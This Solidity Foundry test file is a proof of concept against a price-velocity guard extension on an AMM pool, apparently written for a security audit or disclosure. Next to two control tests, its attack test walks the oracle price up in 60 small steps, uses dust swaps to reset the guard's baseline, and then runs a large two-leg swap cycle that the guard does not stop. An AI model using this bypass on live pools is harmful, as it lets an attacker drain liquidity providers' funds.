// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {MetricOmmPoolBaseTest, Q64} from "./MetricOmmPool.base.t.sol";
import {MetricOmmPool} from "../contracts/MetricOmmPool.sol";
import {PriceVelocityGuardExtension} from "../contracts/extensions/PriceVelocityGuardExtension.sol";
import {BinState} from "../contracts/types/PoolStorage.sol";
import {console} from "forge-std/Test.sol";

contract GuardFactoryStub {
    mapping(address => bool) public isPool;
    mapping(address => address) public poolAdmin;

    function setPool(address pool_, address admin_) external {
        isPool[pool_] = true;
        poolAdmin[pool_] = admin_;
    }
}

contract PriceVelocityGuardPoolIntegrationPoCTest is MetricOmmPoolBaseTest {
    GuardFactoryStub internal guardFactory;
    PriceVelocityGuardExtension internal guard;
    MetricOmmPool internal guardedPool;
    uint256 internal constant USER = 0;

    function setUp() public override {
        super.setUp();
        guardFactory = new GuardFactoryStub();
        guard = new PriceVelocityGuardExtension(address(guardFactory));

        (BinState[] memory nn, BinState[] memory ng) = _defaultBinStateArrays();
        guardedPool = _deployPoolAndRegister(
            PoolDeployParams({
                priceProvider: address(oracle),
                extensions: _singleExtensionPoolExtensions(address(guard)),
                extensionOrders: _extensionOrdersWithBeforeSwap(),
                immutablePriceProvider: true,
                protocolSpreadFeeE6: PROTOCOL_FEE,
                adminSpreadFeeE6: ADMIN_FEE,
                curBinDistFromProvidedPriceE6: 0,
                nonNegativeBinStates: nn,
                negativeBinStates: ng,
                protocolNotionalFeeE8: 0,
                adminNotionalFeeE8: 0,
                immutablePriceProviderForRegistry: address(oracle),
                lowestBin: -1,
                highestBin: 0
            })
        );

        guardFactory.setPool(address(guardedPool), admin);
        pool = guardedPool;
        _approveUsersForPool(address(guardedPool));
        _addLiquidity(USER, -1, 0, 1_000_000, 0);

        oracle.setBidAndAskPrice(uint128(Q64), uint128(Q64 + 1));
        guard.setMaxChangePerBlock(address(guardedPool), 1e15); // strict 0.1%/block cap

        vm.prank(admin);
        guard.setLastMidPrice(address(guardedPool), uint128(Q64));
    }

    /// CONTROL A: a single call spanning the full ~5% shock correctly reverts,
    /// confirming the guard's check logic is sound in isolation.
    function test_ControlA_SingleFullShockCallReverts() public {
        vm.roll(2);
        oracle.setBidAndAskPrice(
            uint128(Q64) + uint128(Q64 * 5 / 100),
            uint128(Q64) + uint128(Q64 * 5 / 100) + 1
        );
        vm.expectRevert();
        _swap(USER, users[USER], true, _i128ExactIn(900_000), 0);
    }

    /// CONTROL B: identical notional swap with the guard DISABLED, establishing the
    /// baseline change in pool value from the pool's own mechanics alone.
    function test_ControlB_SingleLargeSwapBaselineLoss() public {
        vm.roll(2);
        vm.prank(admin);
        guard.setMaxChangePerBlock(address(guardedPool), type(uint64).max);

        uint128 shockedMid = uint128(Q64) + uint128(Q64 * 5 / 100);
        oracle.setBidAndAskPrice(shockedMid, shockedMid + 1);

        uint256 pool0Before = token0.balanceOf(address(guardedPool));
        uint256 pool1Before = token1.balanceOf(address(guardedPool));

        _swap(USER, users[USER], true, _i128ExactIn(900_000), 0);

        uint256 pool0After = token0.balanceOf(address(guardedPool));
        uint256 pool1After = token1.balanceOf(address(guardedPool));

        uint256 valueBefore = (pool0Before * uint256(shockedMid)) / Q64 + pool1Before;
        uint256 valueAfter = (pool0After * uint256(shockedMid)) / Q64 + pool1After;

        console.log("CONTROL B (guard disabled) value before:", valueBefore);
        console.log("CONTROL B (guard disabled) value after: ", valueAfter);
    }

    /// ATTACK: guard remains ACTIVE. Walk the oracle price up in 60 small steps,
    /// pinging the guard with a tiny dust swap after each step to reset its baseline
    /// via the same-block accounting gap, then execute the full two-leg cycle.
    function test_Attack_TwoLegCycleBypassesGuardOnRealPool() public {
        vm.roll(2);

        uint128 startMid = uint128(Q64);
        uint128 shockedMid = startMid + uint128(Q64 * 5 / 100);
        uint128 step = (shockedMid - startMid) / 60;

        uint256 pool0Before = token0.balanceOf(address(guardedPool));
        uint256 pool1Before = token1.balanceOf(address(guardedPool));

        for (uint256 i = 1; i <= 60; i++) {
            uint128 currentMid = startMid + (step * uint128(i));
            if (i == 60) currentMid = shockedMid;
            oracle.setBidAndAskPrice(currentMid, currentMid + 1);
            _swap(USER, users[USER], true, _i128ExactIn(100), 0); // dust ping, resets guard baseline
        }

        // Guard is still ACTIVE. Both legs of the cycle now execute without reverting.
        (, int256 a1Leg1) = _swap(USER, users[USER], true, _i128ExactIn(900_000), 0);
        uint128 token1Received = uint128(uint256(a1Leg1 > 0 ? a1Leg1 : -a1Leg1));
        _swap(USER, users[USER], false, _i128ExactIn(token1Received), type(uint128).max);

        uint256 pool0After = token0.balanceOf(address(guardedPool));
        uint256 pool1After = token1.balanceOf(address(guardedPool));

        uint256 valueBefore = (pool0Before * uint256(shockedMid)) / Q64 + pool1Before;
        uint256 valueAfter = (pool0After * uint256(shockedMid)) / Q64 + pool1After;

        console.log("ATTACK (guard bypassed, still active) value before:", valueBefore);
        console.log("ATTACK (guard bypassed, still active) value after: ", valueAfter);
    }
}
